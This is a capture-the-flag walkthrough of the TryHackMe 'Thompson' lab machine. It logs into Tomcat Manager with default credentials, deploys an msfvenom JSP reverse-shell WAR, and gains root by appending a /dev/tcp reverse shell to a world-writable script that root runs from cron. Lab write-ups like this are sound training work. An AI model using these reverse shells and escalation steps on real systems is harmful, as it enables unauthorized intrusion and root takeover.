---

Name: Thompson
Difficulty: Easy
URL: https://tryhackme.com/room/bsidesgtthompson
Description: boot2root machine for FIT and bsides guatemala CTF

---


## Enumeration

I started with an Nmap scan:

```bash
nmap -sC -sV -p- 10.113.144.239
```

The important results were:

```text
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 8.5.5
```

The Tomcat service on port `8080` immediately stood out, especially because an AJP service was also exposed on port `8009`.

### Investigating Tomcat

I first checked whether the Tomcat version was vulnerable to CVE-2017-12617:

```bash
python3 exploit.py -u http://10.113.144.239:8080
```

The exploit reported:

```text
Poc Filename  Poc.jsp
Not Vulnerable to CVE-2017-12617
```

Since AJP was exposed, I also tested for **Ghostcat (CVE-2020-1938)** using Metasploit:

```text
msf > use auxiliary/admin/http/tomcat_ghostcat
msf auxiliary(admin/http/tomcat_ghostcat) > set RHOSTS 10.113.144.239
msf auxiliary(admin/http/tomcat_ghostcat) > run
```

The exploit successfully read `/WEB-INF/web.xml`, but the file only contained the default Tomcat configuration and didn't provide anything useful.

This meant that exploiting the Tomcat version wasn't the intended route.

---

## Tomcat Manager

I checked the Tomcat Manager application on port `8080`.

The Manager required authentication, so I looked for default credentials instead of immediately attempting a brute force.

I used a list of known Apache Tomcat default credentials:

https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown

One of the credentials worked:

```text
Username: tomcat
Password: s3cret
```

These credentials provided access to the **Tomcat Web Application Manager**.

---

## Getting a Shell

The Tomcat Manager allows authenticated users to deploy WAR files.

I generated a Java JSP reverse shell using `msfvenom`:

```bash
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=192.168.131.170 \
  LPORT=4444 \
  -f war \
  -o shell.war
```

I then started a listener:

```bash
nc -lvnp 4444
```

I uploaded `shell.war` through the Tomcat Manager and accessed the deployed application at:

```text
http://10.113.144.239:8080/shell/
```

This gave me a shell as the Tomcat user:

```text
tomcat@ubuntu
```

---

## User Flag

I enumerated `/home`:

```bash
ls -la /home
```

There was a user named `jack`.

Inside `/home/jack` I found:

```bash
ls -l
```

```text
total 12
-rwxrwxrwx 1 jack jack 26 Aug 14  2019 id.sh
```

I also found `test.txt`:

```bash
cat test.txt
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

The contents of `id.sh` explained this:

```bash
cat id.sh
```

```bash
#!/bin/bash
id > test.txt
```

The fact that `test.txt` contained `uid=0(root)` suggested that `id.sh` was being executed by root.

---

## Privilege Escalation

I checked the system-wide cron jobs:

```bash
cat /etc/crontab
```

The important entry was:

```text
*  *    * * *   root    cd /home/jack && bash id.sh
```

This means:

```text
Every minute
    ↓
root
    ↓
cd /home/jack
    ↓
bash id.sh
```

I checked the permissions of the script:

```bash
ls -l id.sh
```

```text
-rwxrwxrwx 1 jack jack 26 Aug 14  2019 id.sh
```

The script was **world-writable**, meaning the Tomcat user could modify a script that was executed by root every minute.

This gave me a straightforward privilege-escalation path:

```text
Tomcat user
    ↓
Writable /home/jack/id.sh
    ↓
Root cron job executes id.sh
    ↓
Commands execute as root
    ↓
Root shell
```

---

## Getting a Root Shell

I appended a reverse shell to `id.sh`:

```bash
echo "sh -i >& /dev/tcp/192.168.131.170/1234 0>&1" >> id.sh
```

The resulting script was:

```bash
#!/bin/bash
id > test.txt
sh -i >& /dev/tcp/192.168.131.170/1234 0>&1
```

I then started a listener on my machine:

```bash
nc -lvnp 1234
```

After the cron job executed, I received a connection:

```text
connect to [192.168.131.170] from (UNKNOWN) [10.113.144.239]
```

Checking the privileges:

```bash
whoami
```

```text
root
```

And:

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

I now had a root shell.
